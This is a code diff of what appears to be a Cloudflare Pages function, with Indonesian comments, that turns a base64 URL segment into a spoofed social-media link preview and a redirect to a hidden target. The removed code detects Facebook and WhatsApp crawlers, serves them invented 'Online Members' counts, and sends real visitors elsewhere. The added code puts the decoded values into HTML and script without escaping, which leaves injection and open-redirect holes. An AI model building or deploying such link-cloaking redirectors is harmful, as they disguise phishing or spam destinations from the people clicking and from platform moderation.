@@ -1,35 +1,44 @@
 export async function onRequest(context) {
-  const url = new URL(context.request.url);
-  // Mengambil bagian setelah slash terakhir
-  // Contoh: /bola/base64kode -> p = "base64kode"
-  const pathParts = url.pathname.split('/');
-  const p = pathParts[pathParts.length - 1];
-  
-  let u = 'https://google.com', t = 'Loading...', i = '';
+  const { params } = context;
+  const base64Data = params.path[0];
 
-  if (p && p.length > 10) { // Cek apakah p ada dan cukup panjang (bukan sekedar path kosong)
-    try {
-      const decoded = atob(p);
-      const params = new URLSearchParams(decoded);
-      u = params.get('u') || u;
-      t = params.get('t') || t;
-      i = params.get('i') || i;
-    } catch (e) {}
+  // Jika tidak ada data Base64 (akses halaman utama), biarkan normal
+  if (!base64Data || base64Data === "index.html") {
+    return context.next();
   }
 
-  const randomNum = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
-  const formattedNum = randomNum.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-  const variations = [`${formattedNum} Online Members`, `${formattedNum} Views Active`, `${formattedNum} Active Now` ];
-  const d = variations[Math.floor(Math.random() * variations.length)];
+  try {
+    // Decode data dari URL
+    const jsonString = atob(base64Data);
+    const data = JSON.parse(jsonString);
 
-  const ua = context.request.headers.get('user-agent') || '';
-  const isBot = /facebookexternalhit|Facebot|WhatsApp|Messenger|Twitterbot/i.test(ua);
+    // Ambil variabel t (title), i (image), u (url target)
+    const title  = data.t || "Klik untuk melihat";
+    const image  = data.i || "";
+    const target = data.u || "https://google.com";
 
-  if (isBot) {
-    return new Response(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>${t}</title><meta name="description" content="${d}"><meta property="og:title" content="${t}"><meta property="og:description" content="${d}"><meta property="og:image" content="${i}"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"></head><body></body></html>`, { 
-      headers: { "content-type": "text/html;charset=UTF-8" } 
+    // HTML inilah yang akan dibaca oleh bot WhatsApp/Facebook
+    const html = `<!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="UTF-8">
+      <title>${title}</title>
+      <meta property="og:title" content="${title}" />
+      <meta property="og:image" content="${image}" />
+      <meta property="og:type" content="website" />
+      <meta name="twitter:card" content="summary_large_image">
+      
+      <script>window.location.replace("${target}");</script>
+      <meta http-equiv="refresh" content="0;url=${target}">
+    </head>
+    <body style="background:#000;"></body>
+    </html>`;
+
+    return new Response(html, {
+      headers: { "content-type": "text/html;charset=UTF-8" },
     });
+  } catch (e) {
+    // Jika Base64 rusak atau bukan format JSON
+    return new Response("Invalid URL", { status: 400 });
   }
-
-  return new Response(null, { status: 302, headers: { "Location": u } });
 }
